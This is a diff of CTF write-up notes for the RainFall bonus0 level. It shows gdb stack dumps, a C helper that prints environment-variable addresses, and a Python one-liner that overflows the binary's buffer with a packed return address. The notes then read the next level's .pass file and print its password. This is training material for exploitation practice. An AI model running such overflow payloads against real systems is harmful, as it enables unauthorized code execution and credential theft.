@@ -62,9 +62,9 @@ gs             0x33	51
 0xbffff760:	0x00000000	0x361e3474	0x01597064	0x00000000
 0xbffff770:	0x00000000	0x00000000	0x00000001	0x08048400
 (gdb) q
-bonus0@RainFall:~$ cat > /tmp/getenv.c
+bonus0@RainFall:~$ cat > /tmp/getenv.c // create 
 
-nano /tmp/getenv.c
+vim  /tmp/getenv.c  
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -72,11 +72,24 @@ int main(int argc, char **argv)
 {
     printf("%p\n", getenv(argv[1]));
 }
+vim  /tmp/getenv.c 
+
 gcc /tmp/getenv.c -o /tmp/getenv
 cat /tmp/payload - | ./bonus0
  - 
  - 
 AAAAAAAAAAAAAAAAAAAABBBBBBBBB��� BBBBBBBBB���
+
+bonus0@RainFall:
+(python -c "
+
+import struct
+
+addr = struct.pack('<I', 0xbffff8a6)  
+
+print 'A'*4095 + '\n' + 'Aa0Aa1Aa2' + addr + 'B'*10
+
+"; cat) | ./bonus0
 
 cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
